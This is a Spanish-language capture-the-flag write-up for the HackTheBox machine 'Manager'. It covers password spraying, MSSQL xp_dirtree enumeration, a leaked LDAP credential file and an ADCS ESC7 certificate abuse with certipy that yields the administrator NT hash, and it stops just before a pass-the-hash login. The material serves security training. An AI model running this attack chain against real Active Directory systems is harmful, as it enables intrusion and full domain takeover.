Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #xp_dirtree #mssql #password-spraying #esc7 #certificates #adcs
 
![](assets/Pasted%20image%2020260125232215.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ ping -c 1 10.129.74.99
PING 10.129.74.99 (10.129.74.99) 56(84) bytes of data.
64 bytes from 10.129.74.99: icmp_seq=1 ttl=127 time=86.7 ms

--- 10.129.74.99 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.740/86.740/86.740/0.000 ms
```

Ahora voy a tirar un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.74.99 -oG nmap/allPorts

Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49727/tcp open  unknown          syn-ack ttl 127
49769/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos voy a realizar un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49693,49694,49695,49727,49769 -sV -sC -Pn -n -sS 10.129.74.99 -oN nmap/target

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-26 12:26:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-26T12:27:58+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-01-26T12:27:59+00:00; +7h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.74.99:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-01-26T12:27:58+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-01-26T12:22:39
|_Not valid after:  2056-01-26T12:22:39
| ms-sql-info:
|   10.129.74.99:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-01-26T12:27:58+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-01-26T12:27:59+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
49769/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-26T12:27:18
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

Por la información que tengo puedo intuir que estoy contra un `DC`.

- Puerto 80 HTTP
- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 389, 636 LDAP
- Puerto 1433 MSSQL
- Puerto 5985 WinRm
## Enumeración

### Puerto 445 SMB.

Saque información general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc smb 10.129.74.99
SMB         10.129.74.99    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
```

- Tengo el nombre del dominio **manager.htb** y el nombre de la maquina **DC01**


Enumere los shares a los que tengo acceso como el usuario **guest** pero no había nada raro:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc smb 10.129.74.99 -u 'guest' -p '' --shares
SMB         10.129.74.99    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.99    445    DC01             [+] manager.htb\guest:
SMB         10.129.74.99    445    DC01             [*] Enumerated shares
SMB         10.129.74.99    445    DC01             Share           Permissions     Remark
SMB         10.129.74.99    445    DC01             -----           -----------     ------
SMB         10.129.74.99    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.74.99    445    DC01             C$                              Default share
SMB         10.129.74.99    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.74.99    445    DC01             NETLOGON                        Logon server share
SMB         10.129.74.99    445    DC01             SYSVOL                          Logon server share
```

Tambien puedo enumerar usuarios via rid bruteforce:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc smb manager.htb -u 'guest' -p '' --rid-brute
SMB         10.129.74.99    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.99    445    DC01             [+] manager.htb\guest:
SMB         10.129.74.99    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.74.99    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.74.99    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.74.99    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.74.99    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.74.99    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.74.99    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.74.99    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.74.99    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.74.99    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.74.99    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.74.99    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.74.99    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.74.99    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.74.99    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.74.99    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.74.99    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.74.99    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.74.99    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.74.99    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.74.99    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.74.99    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.74.99    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.74.99    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.74.99    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.74.99    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.74.99    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.74.99    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.74.99    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.74.99    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.74.99    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.74.99    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

### Puerto 80 HTTP.

En el puerto 80 corre una web sobre escritura.

![](assets/Pasted%20image%2020260125233222.png)

- Aparte de la landing page no había nada raro
#### Tecnologías Web.

Wappalyzer detecta que corre sobre un IIS.

![](assets/Pasted%20image%2020260125233239.png)

#### Fuzzing de Directorios.

Realice fuzzing sobre la web pero no encontré nada raro.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://manager.htb/FUZZ/ -e .txt,.js,.git,.xml,.html -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://manager.htb/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .txt .js .git .xml .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 92ms]
js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 95ms]
css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 89ms]
Images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 102ms]
CSS                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 92ms]
JS                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 89ms]
Js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 128ms]
Css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 89ms]
IMAGES                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 89ms]
```

## Acceso Inicial.

No tengo mucha información, por lo cual puedo tratar de usar los usuarios encontrados como usuario / contraseña para ver si alguno es valido.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc smb manager.htb -u users.txt -p users.txt --no-bruteforce\

SMB         10.129.74.99    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.99    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE
SMB         10.129.74.99    445    DC01             [+] manager.htb\operator:operator
```

- El [+] en operator nos indica que esta cuenta es valida

Ahora que tengo credenciales puedo probarlas en distintos servicios:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc smb manager.htb -u operator -p operator

SMB         10.129.74.99    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.99    445    DC01             [+] manager.htb\operator:operator


┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc mssql manager.htb -u operator -p operator
MSSQL       10.129.74.99    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.129.74.99    1433   DC01             [+] manager.htb\operator:operator
```

- Las credenciales son validas para SMB y MSSQL.

Me voy a conectar a MSSQL para enumerar las bases de datos:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ impacket-mssqlclient operator@10.129.74.99 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> select name from sys.databases;
name
------
master
tempdb
model
msdb
```

- Todas las bases de datos son estándar

También enumere linked servers y usuarios que pudiera suplantar pero no encontré nada.

```bash
SQL (MANAGER\Operator  guest@master)> SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name
----
SQL (MANAGER\Operator  guest@master)> SELECT srvname, isremote FROM sysservers;
srvname           isremote
---------------   --------
DC01\SQLEXPRESS          1
```

Otra cosa que puedo probar es el stored procedure `xp_dirtree`.

- Este stored procedure me sirve para listar directorios del sistema.

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
subdirectory                depth   file
-------------------------   -----   ----
$Recycle.Bin                    1      0
Documents and Settings          1      0
inetpub                         1      0
PerfLogs                        1      0
Program Files                   1      0
Program Files (x86)             1      0
ProgramData                     1      0
Recovery                        1      0
SQL2019                         1      0
System Volume Information       1      0
Users                           1      0
Windows                         1      0
```

Al parecer el stored procedure esta habilitado, por lo cual puedo tratar de enumerar archivos del sistema.

- En el directorio de la pagina web encontré un zip llamado `website-backup-27-07-23-old.zip`

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub
subdirectory   depth   file
------------   -----   ----
custerr            1      0
history            1      0
logs               1      0
temp               1      0
wwwroot            1      0
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1
contact.html                          1      1
css                                   1      0
images                                1      0
index.html                            1      1
js                                    1      0
service.html                          1      1
web.config                            1      1
website-backup-27-07-23-old.zip       1      1
```

El archivo esta alojado en la web, por lo cual puedo descargarlo directamente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ wget http://manager.htb/website-backup-27-07-23-old.zip
--2026-01-26 06:27:02--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.74.99
Connecting to manager.htb (manager.htb)|10.129.74.99|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip                      100%[======================================================================================================================>]   1021K   412KB/s    in 2.5s

2026-01-26 06:27:05 (412 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

Lo voy a unziper.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager/content]
└─$ unzip website-backup-27-07-23-old.zip -d website-backup
```

El zip contenía los siguientes archivos, donde destaca el archivo `.old-conf.xml`.

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/manager/content/website-backup]
└─$ ls -la
total 68
drwxrwxr-x 5 wndr wndr  4096 Jan 26 06:28 .
drwxrwxr-x 3 wndr wndr  4096 Jan 26 06:28 ..
-rw-rw-r-- 1 wndr wndr  5386 Jul 27  2023 about.html
-rw-rw-r-- 1 wndr wndr  5317 Jul 27  2023 contact.html
drwxrwxr-x 2 wndr wndr  4096 Jan 26 06:28 css
drwxrwxr-x 2 wndr wndr  4096 Jan 26 06:28 images
-rw-rw-r-- 1 wndr wndr 18203 Jul 27  2023 index.html
drwxrwxr-x 2 wndr wndr  4096 Jan 26 06:28 js
-rw-rw-r-- 1 wndr wndr   698 Jul 27  2023 .old-conf.xml
-rw-rw-r-- 1 wndr wndr  7900 Jul 27  2023 service.html
```

Al ver el contenido del archivo puedo ver unas credenciales para el usuario Raven.

- raven / R4v3nBe5tD3veloP3r!123

```bash
┌──(wndr㉿wndr)-[~/…/hackthebox/manager/content/website-backup]
└─$ cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Puedo probar estas credenciales en distintos servicios:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc smb manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.129.74.99    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.99    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123

┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ nxc winrm manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
WINRM       10.129.74.99    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.129.74.99    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

- Las credenciales sirven para SMB y WinRm.

Ahora puedo conectarme a la maquina y obtener la primera flag:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'

*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
*Evil-WinRM* PS C:\Users\Raven\Documents> cd ..
*Evil-WinRM* PS C:\Users\Raven> CD Desktop
*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
5a4d84cc5037a8d00******
```

## Escalada de Privilegios.

En tema de grupos y privilegios tengo los siguientes:

```bash
*Evil-WinRM* PS C:\Users\Raven\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Raven\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

- Nada raro.

Una de las cosas que puedo hacer es escanear por certificados vulnerables usando `certipy`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.74.99 -stdout -vulnerable

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Raven
                                          MANAGER.HTB\Authenticated Users
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

- La autoridad certificadora **manager-DC01-CA** es vulnerable a ESC7.

!!! info
    ESC7 es una vulnerabilidad en Active Directory Certificate Services que ocurre cuando un atacante tiene permisos de gestión sobre la CA (por ejemplo, Add/Manage Officers), permitiéndole aprobar solicitudes de certificados y, en consecuencia, emitir certificados para identidades privilegiadas como Administrator o Domain Admin.

Primero necesito convertirme en "officer" para aprobar solicitudes de certificados.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.74.99' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -add-officer 'raven'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

Ahora tenemos que habilitar el certificado `SubCA`.

!!! info
    La plantilla `SubCA` es especialmente peligrosa, ya que permite emitir certificados capaces de firmar otros certificados y ademas requiere de aprobacion manual.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.74.99' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -enable-template 'SubCA'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

Ahora solicitaremos un certificado que inicialmente va a fallar ya que la plantilla `SubCA` requiere de aprobación manual. Es necesario guardar la clave generada.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip '10.129.74.99' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -template 'SubCA' \
    -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate
```

Ahora necesitamos aprobar la solicitud para poder generar un certificado valido.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.74.99' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -issue-request '19'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 19
```

Con la solicitud aprobada, ya puedo solicitar el certificado usando la clave.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip '10.129.74.99' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -retrieve '19'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Loaded private key from '19.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Y con el certificado puedo solicitar un TGT y obtener el hash NTLM.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.74.99
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*]     Security Extension SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

Con el hash puedo realizar Pass The Hash y conectarme via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/manager]
